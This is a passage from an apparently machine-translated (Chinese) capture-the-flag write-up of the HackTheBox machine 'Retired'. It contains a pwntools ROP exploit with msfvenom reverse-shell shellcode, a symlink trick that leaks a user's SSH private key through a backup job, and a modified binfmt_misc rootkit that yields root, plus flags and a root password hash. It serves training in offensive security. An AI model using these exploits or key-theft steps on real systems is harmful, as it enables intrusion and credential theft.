ms b gy mx my l mz na">from pwn import *<br/>import requests<br/><br/>## Set Runtime variables<br/>context.binary = './activate_license'<br/>## Change the value of int to what we retrieved above<br/>libc_start = int('7fb1ff018000', 16)<br/>## Path to the binary on the box which we found earlier<br/>libc_path = "/usr/lib/x86_64-linux-gnu/libc-2.31.so"<br/>## Change the value of int to what we retrieved above<br/>libsqlite_start = int('7fb1ff1dd000', 16)<br/>## Path to the binary on the box which we found earlier<br/>libsqlite_path = "/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6"<br/>## Change the value of int to what we retrieved above<br/>stack_start = int('7fffddc82000', 16)<br/>stack_end  = int('7fffddca3000', 16)<br/>## Calculate length of stack<br/>stack_length = stack_end - stack_start<br/>## Paste shellcode from msfvenom we created earlier, make sure you have your Kali IP and port<br/>buf =  b""<br/>buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"<br/>buf += b"\x97\x48\xb9\x02\x00\x11\x5c\x0a\x0a\x0e\xc6\x51\x48"<br/>buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"<br/>buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"<br/>buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"<br/>buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"<br/>## Use pwntools to create an object of the libc-2.31.so file we downloaded<br/>libc          = ELF("./libc-2.31.so",checksec=False)<br/>## Set start address to value we set above<br/>libc.address  = libc_start<br/>## Use pwntools to create an object of the libspqlite3.so.0.8.6 file we downloaded<br/>libsql        = ELF("./libsqlite3.so.0.8.6",checksec=False)<br/>## Set start address to value we set above<br/>libsql.address = libsqlite_start<br/>## Use pwntools ROP function to create an oject containing the libc and libsql objects we created above<br/>rop            = ROP([libc, libsql])<br/>## Look at the symbols table for value of mprotect in the libc object we created above<br/>mprotect = libc.symbols['mprotect']<br/>## Look in the rop object created above for the following register addresses<br/>pop_rdi  = rop.rdi[0]<br/>pop_rsi  = rop.rsi[0]<br/>pop_rdx  = rop.rdx[0]<br/>jmp_rsp  = rop.jmp_rsp[0]<br/>## Set offset to the value we found earlier by causing a segfault<br/>offset  = 520<br/># Build payload using all of the above<br/>payload = b'A' * offset<br/>payload += p64(pop_rdi) + p64(stack_start)<br/>payload += p64(pop_rsi) + p64(stack_length)<br/>payload += p64(pop_rdx) + p64(7)<br/>payload += p64(mprotect)<br/>payload += p64(jmp_rsp)<br/>payload += buf<br/># Post payload to the binary on the box to crash it like we did locally<br/>requests.post('http://10.10.11.154/activate_license.php', files = { "licensefile": payload } )</span></pre><p id="7a17" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">一旦你用当前的libc，libsql，stack值和你的msfvenom外壳代码更新了它，保存它。在您选择的端口上启动nc侦听，然后运行脚本:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="9433" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# python pencer_exploit.py<br/>[*] '/root/htb/retired/activate_license'<br/>    Arch:     amd64-64-little<br/>    RELRO:    Full RELRO<br/>    Stack:    No canary found<br/>    NX:       NX enabled<br/>    PIE:      PIE enabled<br/>[*] Loaded 190 cached gadgets for './libc-2.31.so'<br/>[*] Loaded 162 cached gadgets for './libsqlite3.so.0.8.6'</span></pre><h1 id="8f7f" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">反向外壳</h1><p id="d013" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">切换到我们等待的nc，看看我们终于有了一个反向外壳:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="c68e" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# nc -nlvp 4444<br/>listening on [any] 4444 ...<br/>connect to [10.10.14.198] from (UNKNOWN) [10.10.11.154] 44748</span></pre><p id="d747" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">第一件事总是升级到更好的shell:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="78c1" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# nc -nlvp 4444<br/>listening on [any] 4444 ...<br/>/usr/bin/python3 -c 'import pty;pty.spawn("/usr/bin/bash")'<br/>www-data@retired:/var/www$ ^Z<br/>zsh: suspended  nc -nlvp 4444<br/>┌──(root㉿kali)-[~/htb/retired]<br/>└─# stty raw -echo; fg<br/>[1]  + continued  nc -nlvp 4444<br/>www-data@retired:/var/www$ stty rows 60 cols 236<br/>www-data@retired:/var/www$ export TERM=xterm</span></pre><p id="cf30" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">查看我们当前的文件夹会发现可疑文件:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="46e3" class="mw ld iq ms b gy mx my l mz na">www-data@retired:/var/www$ ls -l<br/>www-data 505153 Jun 25 11:12 2022-06-25_11-12-04-html.zip<br/>www-data 505153 Jun 25 11:13 2022-06-25_11-13-01-html.zip<br/>www-data 505153 Jun 25 11:14 2022-06-25_11-14-04-html.zip<br/>www-data   4096 Mar 11 14:36 html<br/>www-data  20480 Jun 25 10:56 license.sqlite</span></pre><p id="4ccf" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">创建时间相隔一分钟的三个zip文件表明有一个任务定期运行来创建它们。让我们搜索包含文件名中一致部分的文件:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="9b83" class="mw ld iq ms b gy mx my l mz na">www-data@retired:/var/www$ grep -r / -e '-html.zip' 2&gt;/dev/null<br/>/usr/bin/webbackup:DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"</span></pre><h1 id="9f3f" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">网站备份</h1><p id="f534" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">我们找到一个名为webbackup的文件，让我们来看看:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="553a" class="mw ld iq ms b gy mx my l mz na">www-data@retired:/var/www$ cat /usr/bin/webbackup <br/>#!/bin/bash<br/>set -euf -o pipefail<br/>cd /var/www/<br/>SRC=/var/www/html<br/>DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"<br/>/usr/bin/rm --force -- "$DST"<br/>/usr/bin/zip --recurse-paths "$DST" "$SRC"<br/>KEEP=10<br/>/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \<br/>    | sort --zero-terminated --numeric-sort --reverse \<br/>    | while IFS= read -r -d '' backup; do<br/>        if [ "$KEEP" -le 0 ]; then<br/>            /usr/bin/rm --force -- "$backup"<br/>        fi<br/>        KEEP="$((KEEP-1))"<br/>    done</span></pre><p id="390a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这是一个简单的脚本，它将/var/www/html的内容备份到/var/www中的一个文件中。让我们看看是什么触发了这个脚本:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="3efd" class="mw ld iq ms b gy mx my l mz na">www-data@retired:/var/www$ grep -r /etc -e 'webbackup' 2&gt;/dev/null<br/>/etc/systemd/system/website_backup.service:ExecStart=/usr/bin/webbackup</span></pre><p id="57e7" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们可以看到systemd中有一个正在执行webbackup脚本的服务。让我们看看服务:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="1f89" class="mw ld iq ms b gy mx my l mz na">www-data@retired:/var/www$ cat /etc/systemd/system/website_backup.service<br/>[Unit]<br/>Description=Backup and rotate website<br/>[Service]<br/>User=dev<br/>Group=www-data<br/>ExecStart=/usr/bin/webbackup<br/>[Install]<br/>WantedBy=multi-user.target</span></pre><p id="1e3f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">该服务由用户dev运行，让我们看看/home:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="8417" class="mw ld iq ms b gy mx my l mz na">www-data@retired:/var/www/html$ ls -l /home<br/>drwx------ 6 dev dev 4096 Mar 11 14:36 dev</span></pre><p id="ee65" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们看到dev是唯一的用户，但我们无法深入了解。回想一开始，我们看到端口22在nmap扫描中打开。假设dev用户将有访问权是安全的，这可能意味着在他们的。ssh文件夹。我们有权限在备份到dev主文件夹中的文件的文件夹中创建符号链接，因为脚本是在它们的上下文中运行的。所以就像我们在<a class="ae lb" href="https://pencer.io/ctf/ctf-htb-seal/" rel="noopener ugc nofollow" target="_blank">封印</a>里做的那样:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="cff9" class="mw ld iq ms b gy mx my l mz na">www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa /var/www/html/id_rsa<br/><br/>ww-data@retired:/var/www/html$ ls -l<br/>-rw-rwSrw- 1 www-data www-data   585 Oct 13  2021 activate_license.php<br/>drwxrwsrwx 3 www-data www-data  4096 Mar 11 14:36 assets<br/>-rw-rwSrw- 1 www-data www-data  4144 Mar 11 11:34 beta.html<br/>drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 css<br/>-rw-rwSrw- 1 www-data www-data 11414 Oct 13  2021 default.html<br/>lrwxrwxrwx 1 www-data www-data    21 Jun 25 11:46 id_rsa -&gt; /home/dev/.ssh/id_rsa<br/>-rw-rwSrw- 1 www-data www-data   348 Mar 11 11:29 index.php<br/>drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 js</span></pre><p id="8068" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们在那里看到了我们的符号链接，现在等待脚本运行。当新备份存在时，将其复制出来，这样它就不会被删除和解压缩:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="f4ec" class="mw ld iq ms b gy mx my l mz na">ww-data@retired:/var/www/html$ cd /dev/shm<br/>www-data@retired:/dev/shm$ cp /var/www/2022-06-25_11-47-04-html.zip .<br/>www-data@retired:/dev/shm$ unzip 2022-06-25_11-47-04-html.zip <br/>Archive:  2022-06-25_11-47-04-html.zip<br/>   creating: var/www/html/<br/>   creating: var/www/html/js/<br/>&lt;SNIP&gt;</span></pre><p id="90cf" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在，我们可以看到复制到该备份中的id_rsa:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="5371" class="mw ld iq ms b gy mx my l mz na">www-data@retired:/dev/shm/var/www/html$ cat id_rsa <br/>-----BEGIN OPENSSH PRIVATE KEY-----<br/>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAA<br/>BAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEA58qqrW05/urHKC<br/>CqCgcIPhGka60Y+nQcngHS6IvG44gcb3w0HN/yfdb6Nzw5wfLeL<br/>D4uDt8k9M7RPgkdnIRwdNFxleNHuHWmK0j7OOQ0rUsrs8LudOdk<br/>&lt;SNIP&gt;<br/>7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=<br/>-----END OPENSSH PRIVATE KEY-----</span></pre><h1 id="096d" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">SSH作为开发人员</h1><p id="a4c1" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">现在，我们可以以dev用户的身份将密钥粘贴到Kali和ssh上的一个文件中:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="12e1" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# nano id_rsa<br/><br/>┌──(root㉿kali)-[~/htb/retired]<br/>└─# chmod 600 id_rsa         <br/><br/>┌──(root㉿kali)-[~/htb/retired]<br/>└─# ssh -i id_rsa dev@10.10.11.154 <br/>Last login: Mon Mar 28 11:36:17 2022 from 10.10.14.23<br/>dev@retired:~$</span></pre><p id="b012" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在继续之前，让我们抓住用户标志:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="a64a" class="mw ld iq ms b gy mx my l mz na">dev@retired:~$ cat user.txt <br/>1908e78d7623086e78a6a7261db3528f</span></pre><p id="054d" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在我们的主文件夹中，我们发现了一个有趣的文件夹:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="b5a9" class="mw ld iq ms b gy mx my l mz na">dev@retired:~$ ls -l<br/>4 drwx------ 2 dev  dev  4096 Mar 11 14:36 activate_license<br/>4 drwx------ 3 dev  dev  4096 Mar 11 14:36 emuemu<br/>4 -rw-r----- 1 root dev    33 Jun 24 05:11 user.txt</span></pre><p id="e7df" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">emuemu是什么？让我们看看:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="597d" class="mw ld iq ms b gy mx my l mz na">dev@retired:~$ cd emuemu/<br/>dev@retired:~/emuemu$ ls -l<br/>-rw------- 1 dev dev   673 Oct 13  2021 Makefile<br/>-rw------- 1 dev dev   228 Oct 13  2021 README.md<br/>-rw------- 1 dev dev 16608 Oct 13  2021 emuemu<br/>-rw------- 1 dev dev   168 Oct 13  2021 emuemu.c<br/>-rw------- 1 dev dev 16864 Oct 13  2021 reg_helper<br/>-rw------- 1 dev dev   502 Oct 13  2021 reg_helper.c<br/>drwx------ 2 dev dev  4096 Mar 11 14:36 test</span></pre><p id="ba30" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">README.md告诉我们一个软件模拟器，但是看看它还没有写的文件。reg_helper二进制文件听起来很有趣，我们可以在。c文件:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="5a4c" class="mw ld iq ms b gy mx my l mz na">dev@retired:~/emuemu$ cat reg_helper.c <br/>#define _GNU_SOURCE<br/><br/>#include &lt;fcntl.h&gt;<br/>#include &lt;stdio.h&gt;<br/>#include &lt;string.h&gt;<br/>#include &lt;sys/stat.h&gt;<br/>#include &lt;sys/types.h&gt;<br/>#include &lt;unistd.h&gt;<br/><br/>int main(void) {<br/>    char cmd[512] = { 0 };<br/><br/>    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;<br/><br/>    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);<br/>    if (-1 == fd)<br/>        perror("open");<br/>    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)<br/>        perror("write");<br/>    if (close(fd) == -1)<br/>        perror("close");<br/><br/>    return 0;<br/>}</span></pre><h1 id="4d9c" class="lc ld iq bd le lf lg lh li lj lk ll lm jw ln jx lo jz lp ka lq kc lr kd ls lt bi translated">Binfmt漏洞利用</h1><p id="0b33" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">这只是<a class="ae lb" href="https://linux.die.net/man/3/read" rel="noopener ugc nofollow" target="_blank">从STDIN读入</a>一个文件，<a class="ae lb" href="https://linux.die.net/man/3/open" rel="noopener ugc nofollow" target="_blank">打开</a>bin fmt _ misc中的寄存器文件，然后<a class="ae lb" href="https://linux.die.net/man/3/write" rel="noopener ugc nofollow" target="_blank">将</a>写入其中。显然这需要进一步的调查，所以经过一番搜索，我在HackTricks上找到了<a class="ae lb" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts#proc-sys-fs-binfmt_misc" rel="noopener ugc nofollow" target="_blank">这个</a>，它告诉我们:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="12af" class="mw ld iq ms b gy mx my l mz na">Poor man's rootkit, leverage binfmt_misc's credentials option to escalate privilege through any suid binary (and to get a root shell) if /proc/sys/fs/binfmt_misc/register is writeable.</span></pre><p id="b7f7" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">查看寄存器文件，我们看到它只对root用户的所有者是可写的:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="b470" class="mw ld iq ms b gy mx my l mz na">dev@retired:~/emuemu$ ls -ls /proc/sys/fs/binfmt_misc/register<br/>0 --w------- 1 root root 0 Jun 24 05:11 /proc/sys/fs/binfmt_misc/register</span></pre><p id="adbf" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这里有一个漏洞【HackTricks向我们指出:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="b05e" class="mw ld iq ms b gy mx my l mz na">┌──(root㉿kali)-[~/htb/retired]<br/>└─# git clone https://github.com/toffan/binfmt_misc.git<br/>Cloning into 'binfmt_misc'...<br/>remote: Enumerating objects: 42, done.<br/>remote: Total 42 (delta 0), reused 0 (delta 0), pack-reused 42<br/>Receiving objects: 100% (42/42), 17.83 KiB | 570.00 KiB/s, done.<br/>Resolving deltas: 100% (20/20), done.<br/><br/>┌──(root㉿kali)-[~/htb/retired/binfmt_misc]<br/>└─# python3 -m http.server 80  <br/>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span></pre><p id="3c80" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">把它拉到盒子旁边，运行它:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="690a" class="mw ld iq ms b gy mx my l mz na">dev@retired:~$ wget http://10.10.14.198/binfmt_rootkit<br/>--2022-06-25 16:45:44--  http://10.10.14.198/binfmt_rootkit<br/>Connecting to 10.10.14.198:80... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 2048 (2.0K) [application/octet-stream]<br/>Saving to: ‘binfmt_rootkit’<br/>binfmt_rootkit     100%[===========&gt;]   2.00K  --.-KB/s    in 0s<br/>2022-06-25 16:45:44 (350 MB/s) - ‘binfmt_rootkit’ saved [2048/2048]<br/><br/>dev@retired:~$ chmod +x binfmt_rootkit <br/><br/>dev@retired:~$ ./binfmt_rootkit<br/>Error: /proc/sys/fs/binfmt_misc/register is not writeable</span></pre><p id="593b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们看到的问题是，只有root拥有对寄存器文件的写访问权限。回到reg_helper二进制文件，我们看到它为我们写入了寄存器文件。我们只需要稍微改变利用方式:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="e30b" class="mw ld iq ms b gy mx my l mz na">dev@retired:~$ cp binfmt_rootkit binfmt_rootkit_pencer<br/>dev@retired:~$ nano binfmt_rootkit_pencer</span></pre><p id="1eab" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">首先，我们可以注释掉该检查，以查看寄存器文件是否可写:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="5f24" class="mw ld iq ms b gy mx my l mz na">EOF<br/>    exit 1<br/>}<br/><br/>#function not_writeable()<br/>#{<br/>#       test ! -w "$mountpoint/register"<br/>#}</span></pre><p id="ad19" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">还要注释掉调用我们刚刚注释掉的函数的那一行:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="e801" class="mw ld iq ms b gy mx my l mz na">[[ -n "$1" ]] &amp;&amp; usage<br/><br/>#not_writeable &amp;&amp; die "Error: $mountpoint/register is not writeable"<br/><br/>target="$(pick_suid "$searchsuid")"<br/>test -e "$target" || die "Error: Unable to find a suid binary in $searchsuid"</span></pre><p id="3033" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在，更改最后一部分，使其调用reg helper二进制文件，而不是尝试写入寄存器文件:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="68c0" class="mw ld iq ms b gy mx my l mz na">chmod a+x "$fmtinterpr"<br/><br/>binfmt_line="_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC"<br/>echo "$binfmt_line" | /home/dev/emuemu/reg_helper<br/><br/>exec "$target"</span></pre><p id="309c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在，当我们运行它时，我们发现它仍然不太正确:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="a659" class="mw ld iq ms b gy mx my l mz na">dev@retired:~$ ./binfmt_rootkit_pencer<br/>./binfmt_rootkit_pencer: line 101: /home/dev/emuemu/reg_helper: Permission denied<br/>umount: bad usage<br/>Try 'umount --help' for more information.</span></pre><p id="0b84" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">当然，reg_helper文件是由dev拥有的，快速查看一下就会发现它的另一个版本隐藏在其他地方:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="51f5" class="mw ld iq ms b gy mx my l mz na">dev@retired:~$ find / -name reg_helper 2&gt;0<br/>/usr/lib/emuemu/reg_helper<br/>/home/dev/emuemu/reg_helper<br/><br/>dev@retired:~$ ls -lsa /usr/lib/emuemu/reg_helper<br/>20 -rwxr-x--- 1 root dev 16864 Oct 13  2021 /usr/lib/emuemu/reg_helper</span></pre><p id="7a8e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这样更好，现在只需更改我们的漏洞脚本中的代码行，改为指向该代码行:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="aa25" class="mw ld iq ms b gy mx my l mz na">echo "$binfmt_line" | /usr/lib/emuemu/reg_helper</span></pre><p id="0e7a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">最后，我们可以运行漏洞并获得一个根外壳:</p><pre class="lv lw lx ly gt mr ms mt mu aw mv bi"><span id="6a65" class="mw ld iq ms b gy mx my l mz na">dev@retired:~$ ./binfmt_rootkit_pencer <br/>uid=0(root) euid=0(root)<br/><br/># cat /root/root.txt<br/>e625876b20e8072dc89a6f64e6083a00<br/><br/># cat /etc/shadow | grep root<br/>root:$y$j9T$WTPWClbhbDs7l.UxQ36u80$ARJoOe6zhfOEca5WFBXjo4fGaxCg1Iof6qTbrfn1CzA:19062:0:99999:7:::</span></pre><p id="3195" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">完成了。我认为这是一个相当困难的盒子，说它应该是中等，但我确实学到了一些东西，所以绝对值得。下次见。</p></div><div class="ab cl ne nf hu ng" role="separator"><span class="nh bw bk ni nj nk"/><span class="nh bw bk ni nj nk"/><span class="nh bw bk ni nj"/></div><div class="ij ik il im in"><p id="9a5b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="a2be" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">推特—<a class="ae lb" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae lb" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="f8bb" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><em class="nl">原载于2022年8月27日</em><a class="ae lb" href="https://pencer.io/ctf/ctf-htb-retired/" rel="noopener ugc nofollow" target="_blank"><em class="nl">https://pencer . io</em></a><em class="nl">。</em></p><h2 id="32fb" class="mw ld iq bd le nm nn dn li no np dp lm ko nq nr lo ks ns nt lq kw nu nv ls nw bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lb" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4条线索、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>